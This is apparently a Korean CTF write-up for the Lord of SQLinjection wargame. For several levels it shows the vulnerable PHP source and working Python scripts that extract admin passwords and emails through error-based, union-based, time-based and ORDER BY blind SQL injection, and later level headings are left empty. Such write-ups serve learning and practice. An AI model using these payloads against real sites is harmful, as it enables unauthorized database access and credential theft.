---
title: \[LOS] Writeup -2
description: Lord of SQLinjection
date: 2024-11-10 00:02:00 +09:00
last_modified_at: 2024-11-10 00:02:00 +09:00
categories: [Hacking, Web]
# toc: false 오른쪽에 있는 목차 비활성화
# comments: false 댓글 비활성화
tags:
  [
    Hacking,
    Database,
  ]
---
## Iron_golem
```php
<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit(mysqli_error($db));
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```
### exploit
sleep과 benchmark를 필터링하는 것을 알 수 있다.<br>
이 두 함수는 timebased SQL-I를 시도할 때 사용하는 것이기에 TimeBased를 사용하지 말라는 뜻으로 생각하고 분석을 했다.

pw에 '를 입력했을 때 오류가 나는 것을 알 수 있고 이를 바탕으로 Error Based SQL-I를 시도해 볼 수 있다.

의도적으로 error를 발생시켜 쿼리가 참인지 알 수 있다.
mysql에서 단일 값을 반환해야하는데 두개의 행을 반환하면 오류가 날 수 있다는 것을 이용하여 python 코드를 작성했다.
```python
import requests
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"

cookie = {'PHPSESSID' : 'cookie 값'}

for len in range(100):
  print(len)
  param = {'pw': f"' or if(length(pw)={len},(select 1 union select 2), 0)#"}
  res = requests.get(url=url, params=param, cookies=cookie)
  if "Subquery" in res.text:
    print(len)
    break

length = 32
password = ""
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    param = {'pw': f"' or if(ord(substr(pw,{str(len)},1))={str(pw)},(select 1 union select 2), 0)#"}
    res = requests.get(url=url,  params=param, cookies=cookie)
    if "Subquery" in res.text:
      password += chr(pw)
      print(password)
      break
        
print(password.lower())
```
<br>

## Dark_eyes
```php
<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```
### exploit
Iron_golem 문제와 비슷하지만 필터링하는 것이 더 많다.<br>
Iron_golem문제처럼 '을 입력해봤지만 빈 화면이 출력되었다.<br>

Iron_golem에서 사용했던 방법은 조건이 참이면 Subquery 에러를 발생시켜 값을 검증하는 것이었다.<br>
하지만 **if**를 사용할 수 없고 에러가 출력되지 않으니 다른 방법을 사용해야한다.

![mysql-test](/assets/img/post/mysql-test.png)

mysql을 사용해 test 해보니 **select 1 union select [조건]** 에서 조건이 참이면 행이 하나만 출력된다.<br>
이를 이용해서 악의적인 쿼리가 참인 경우에만 오류가 나지 않도록 만든다.
```python
import requests
url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"

cookie = {'PHPSESSID' : 'cookie 값'}

for len in range(100):
  param = {'pw': f"' or id='admin' and pw=(select 1 union select length(pw) = {len})#"}
  res = requests.get(url=url, params=param, cookies=cookie)
  if "select id from prob_dark_eyes where" in res.text:
    print(len)
    break

length = 8
password = ""
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    param = {'pw': f"' or id='admin' and pw=(select 1 union select ord(substr(pw,{str(len)},1))={str(pw)})#"}
    res = requests.get(url=url, params=param, cookies=cookie)
    if "select id from prob_dark_eyes where" in res.text:
      password += chr(pw)
      break
        
print(password.lower())
```
<br>

## Hell_fire
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}";
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysqli_query($db,$query);
  while(($result = mysqli_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("hell_fire");
  highlight_file(__FILE__);
?>
```
### exploit
```sql
select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}
-> select id,email,score from prob_hell_fire where 1 order by id DESC
payload = id DESC
```
이러한 값을 입력하여 DB에 저장된 값을 볼 수 있다.<br>
![hell-fire-list](/assets/img/post/hell_fire.png)<br>
DB에 저장된 값을 볼 수 있지만 admin의 email값은 ***로 마스킹 되어있어 볼 수 없었다.<br>
DB 쿼리가 성공했을 때의 반응이 없기 때문에 Timebased를 사용해서 email을 알아낼 것이다.
Darkeye 문제에서 사용한 code에서 union구문 대신 sleep구문을 사용할 것이다.<br>

```python
import requests
import time

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"

cookie = {'PHPSESSID' : 'cookie 값'}

for len in range(100):
  param = {'order': f"if(id='admin' and length(email)={len},sleep(1), 1)#"}
  start = time.time()
  res = requests.get(url=url, params=param, cookies=cookie)
  end = time.time()
  if end - start > 0.5:
    print(len)
    break

length = 28
email = ""
for len in range(1, length+1):
  for char in range(ord('0'), ord('z')):
    param = {'order': f"if(id='admin' and ord(substr(email,{str(len)},1))={str(char)}, sleep(1), 1)#"}
    start = time.time()
    res = requests.get(url=url, params=param, cookies=cookie)
    end = time.time()
    if end - start > 0.5:
      email += chr(char)
      print(email)
      break
        
print(email.lower())
```
<br>

## Evil_wizard
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|proc|union|sleep|benchmark/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_evil_wizard where 1 order by {$_GET[order]}"; // same with hell_fire? really?
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysqli_query($db,$query);
  while(($result = mysqli_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_evil_wizard where id='admin' and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("evil_wizard");
  highlight_file(__FILE__);
?>
```
### exploit
Hell_fire와 같지만 필터링 항목이 늘어났다.
**sleep과 benchmark**가 필터링되었기 때문에 다른 방법을 찾아야한다.
php 코드에 **"// same with hell_fire? really?"** 라는 힌트가 있다.
나는 이 부분이 TimeBased를 사용하지 말라는 의미로 받아들였다.

어떻게 문제를 해결할까 고민하다가, 조건이 참인 값을 넣으면 admin 컬럼이 먼저 출력되는 것을 발견했다.
이를 이용해 문제를 해결했다.
```python
import requests

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"

cookie = {'PHPSESSID' : 'cookie 값'}

for len in range(100):
  param = {'order': f"if(id='admin' and length(email)={len},1,10)#"}
  res = requests.get(url=url, params=param, cookies=cookie)
  if 'score</th><tr><td>admin' in res.text:
    print(len)
    break

length = 30
email = ""
for len in range(1, length+1):
  for char in range(ord('0'), ord('z')):
    param = {'order': f"if(id='admin' and ord(substr(email,{str(len)},1))={str(char)}, 1, 10)#"}
    res = requests.get(url=url, params=param, cookies=cookie)
    if 'score</th><tr><td>admin' in res.text:
      email += chr(char)
      print(email)
      break
        
print(email.lower())
```
<br>

## Green_dragon
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']){
    if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
    $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
    $result = mysqli_fetch_array(mysqli_query($db,$query2));
    if($result['id'] == "admin") solve("green_dragon");
  }
  highlight_file(__FILE__);
?>
```
### exploit
별다른 필터링은 없지만 **'과 "** 를 필터링하기 때문에 새로운 방법을 찾아야한다.<br>
id에 \값을 넣어 이스케이프한다고 해도 or 1=1을 통해 출력되는 값이 없다. 이는 green_dragon 테이블이 비어있다는 것을 의미한다.
값을 출력하기 위해 union select를 사용할 것이다.
```sql
query1: select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'
query2: select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'
->
query1: select id,pw from prob_green_dragon where id='\' and pw='union select 0x5c,0x756e696f6e2073656c65637420636861722839372c3130302c3130392c3130352c3131302923#'
query2: select id from prob_green_dragon where id='\' and pw='union select char(97,100,109,105,110)#'
payload = id=\&pw=union select 0x5c,0x756e696f6e2073656c65637420636861722839372c3130302c3130392c3130352c3131302923%23
```
union을 사용할 때 \과 함께 사용하려면 hex값으로 인코딩 해줘야한다.
<br><br>

## Red_dragon
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\./i', $_GET['id'])) exit("No Hack ~_~");
  if(strlen($_GET['id']) > 7) exit("too long string");
  $no = is_numeric($_GET['no']) ? $_GET['no'] : 1;
  $query = "select id from prob_red_dragon where id='{$_GET['id']}' and no={$no}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  $query = "select no from prob_red_dragon where id='admin'"; // if you think challenge got wrong, look column name again.
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['no'] === $_GET['no']) solve("red_dragon");
  highlight_file(__FILE__);
?>
```
**is_numeric:** 값이 숫자 또는 숫자 문자열인지 확인하는 함수
### exploit
admin에 해당하는 no 값을 알아내야한다.
```python
import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"

cookie = {'PHPSESSID' : 'cookie 값'}

for ran in range(100):
  param = {'id':"'||no>%23", 'no':f"%0a{str(10 ** ran)}"}
  print(f'?id={param['id']}&no={param["no"]}')
  res = requests.get(url=url+f'?id={param['id']}&no={param["no"]}', cookies=cookie)
  if 'Hello admin' not in res.text:
    print(f'10^{ran-1} < no < 10^{ran}')
    break
```
이 코드를 통해 no의 범위를 알아낼 수 있었다.<br>
다음으로 이 범위에 대한 이분 탐색을 이용한 코드로 정확한 값을 알 수 있다. 
```python
import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"

cookie = {'PHPSESSID' : 'cookie 값'}

left = 10 ** 8
right = 10 ** 9
while left<=right:
  mid = (left+right)//2

  param= {'id':"'||no>%23", 'no':f'%0a{mid}'}
  res = requests.get(url=url+ f'?id={param['id']}&no={param["no"]}', cookies=cookie)
  if "Hello admin" in res.text:
    left = mid + 1
  else:
    right = mid - 1
  print(left,right)
print(left,right)
```

## Blue_dragon
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\./i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\./i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(preg_match('/\'|\\\/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/\'|\\\/i', $_GET[pw])) exit("No Hack ~_~");
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("blue_dragon");
  highlight_file(__FILE__);
?>
```
### exploit
이전 문제들과 비슷한 유형이다. 하지만 쿼리를 질의하고 나서 필터링을 하기 때문에 Timebased SQL 취약점이 발생한다.<br>
sleep함수를 사용해서 preg_match가 실행되기 전에 지연시킨다.
```python
import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"

cookie = {'PHPSESSID' : 'cookie 값'}

for i in range(100):
    print(i)
    start = time.time()
    param = {'pw': f"' or if(id='admin' and length(pw)={i},sleep(2),0)-- -"}
    res = requests.get(url=url, params=param, cookies=cookie)
    end = time.time()
    if end - start >= 2:
        print(i)
        break

length = 8
password = ''
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    start = time.time()
    param = {'pw': f"' or id='admin' and if(ord(substr(pw,{str(len)},1))={str(pw)},sleep(3),0)#"}
    res = requests.get(url=url, params=param, cookies=cookie)
    end = time.time()
    if end - start >= 2:
      password += chr(pw)
      print(password)
      break
```
<br>

## frankenstein
## phantom
## ouroboros
## zombie
## alien
## cthulhu
## death
## godzilla
## cyclops
## chupacabra
## manticore
## banshee
## poltergeist
## nessie
## revenant
## yeti
## mummy
## kraken
## cerberus
## siren
## incubus
## AllClear

